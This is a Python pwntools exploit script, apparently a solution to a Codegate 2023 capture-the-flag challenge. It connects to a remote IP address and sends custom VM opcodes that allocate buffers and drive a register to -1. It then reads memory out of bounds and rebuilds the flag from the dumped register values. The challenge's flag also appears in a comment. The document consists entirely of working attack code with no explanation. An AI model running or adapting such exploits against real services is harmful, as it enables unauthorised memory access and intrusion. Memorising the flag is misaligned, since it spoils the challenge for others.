from pwn import *
import ctypes

# p = remote('localhost', 9000)
p = remote("43.202.54.209",1234)
# p = process('./app')
# codegate2023{a77f1e5998a7d38c0e1f77274a344f142a7ff9d167e1419d41d6489fb138b045}

def op2(op, v1, v2):
    return p8(op) + p8(v1) + p16(v2)

def op3(op, v1, v2, v3):
    return p8(op) + p8(v1) + p8(v2) + p8(v3)


z  = []
z.append(u32(op2(2, 0, 0x200))) # alloc
z.append(u32(op3(3, 0, 0, 0xf8))) # r0[0] = 0xff
z.append(u32(op3(3, 0, 1, 0))) # r0[0] = 0xff
z.append(u32(op3(3, 0, 2, 0))) # r0[0] = 0xff
z.append(u32(op3(3, 0, 3, 0))) # r0[0] = 0xff
z.append(u32(op3(3, 0, 4, 0))) # r0[0] = 0xff
z.append(u32(op3(3, 0, 5, 0))) # r0[0] = 0xff
z.append(u32(op3(3, 0, 6, 0))) # r0[0] = 0xff
z.append(u32(op3(3, 0, 7, 0))) # r0[0] = 0xff

z.append(u32(op2(2, 2, 0x200))) # alloc
z.append(u32(op3(1, 2, 0, 0))) # r2 = r0; r0 = 0

z.append(u32(op2(0, 0, 0)))
z.append(u32(op3(6, 0, 0, 2))) # r0 = -1

z.append(u32(op3(5, 2, 0, 1))) # write -1 0?
z.append(u32(op3(1, 3, 0, 0))) # r3 = r0; r0 = 0

z.append(u32(op3(5, 2, 0, 10)))
z.append(u32(op3(2, 1, 0, 100)))

# z.append(u32(op3(0, 0, 0, 8)))
# z.append(u32(op3(6, 0, 0, 1)))
# z.append(u32(op2(7, 0, 0)))

for i in range(0x50):
    z.append(u32(op2(0, 0, i)))
    z.append(u32(op3(6, 0, 0, 2)))
    z.append(u32(op2(7, 0, 0)))

# print(len(z))
p.sendlineafter(b' > ', str(len(z)).encode())
for i in z:
    # print(ctypes.c_int32(i).value)
    p.sendlineafter(b' > ', str(ctypes.c_int32(i).value).encode())

k = ''
p.recvuntil(b'================== [REGS] ==================\n')
for i in range(0x50):
    p.recvuntil(b'X0 : ')
    zz = p.recvline().strip()
    k += chr(int(zz, 16))
    print(k)

p.interactive()
p.close()
